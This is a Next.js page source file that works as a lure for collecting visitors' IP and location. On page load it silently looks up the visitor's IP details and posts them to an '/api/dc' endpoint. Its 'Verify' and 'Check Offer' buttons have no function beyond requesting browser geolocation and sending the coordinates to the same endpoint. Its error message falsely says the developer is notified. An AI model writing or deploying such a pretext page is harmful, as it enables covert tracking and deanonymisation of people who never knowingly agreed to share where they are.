import { useCallback, useEffect, useState } from "react";
import type { NextPage } from "next";
import Head from "next/head";

let loaded = false;

const Home: NextPage = () => {
  const [ip, setIp] = useState("");

  const success: PositionCallback = async (position) => {
    try {
      const data = JSON.stringify(
        {
          ip,
          lat: position.coords.latitude,
          lon: position.coords.longitude,
        },
        null,
        2,
      );

      console.log(data);

      await fetch("/api/dc", {
        method: "POST",
        body: data,
      });
    } catch (error) {
      console.log(error);
    }

    alert("Done! Thank you!");
  };

  const error = () => {
    alert("There is an error. The developer is notified. Thank you!");
  };

  const requestGeo = () => {
    navigator.geolocation.getCurrentPosition(success, error);
  };

  const loadCallback = useCallback(async () => {
    try {
      const response = await fetch(process.env.NEXT_PUBLIC_IPINFO_URL!, {
        mode: "cors",
        headers: {
          "Content-Type": "application/json",
        },
      });

      const data = await response.text();

      const parsedData = JSON.parse(data);

      setIp(parsedData.ip);

      await fetch("/api/dc", {
        method: "POST",
        body: data,
      });
    } catch (error) {
      console.log(error);
    }
  }, []);

  useEffect(() => {
    if (!loaded) {
      loaded = true;
      loadCallback();
    }
  }, [loadCallback]);

  return (
    <div style={{ height: "100vh" }}>
      <Head>
        <title>Get Latest Info</title>
      </Head>

      <div className="header">
        <h3>Welcome</h3>

        <p>Choose one of the options below.</p>
      </div>

      <div className="container">
        <button onClick={requestGeo}>Verify</button>
        <button onClick={requestGeo}>Check Offer</button>
      </div>
    </div>
  );
};

export default Home;
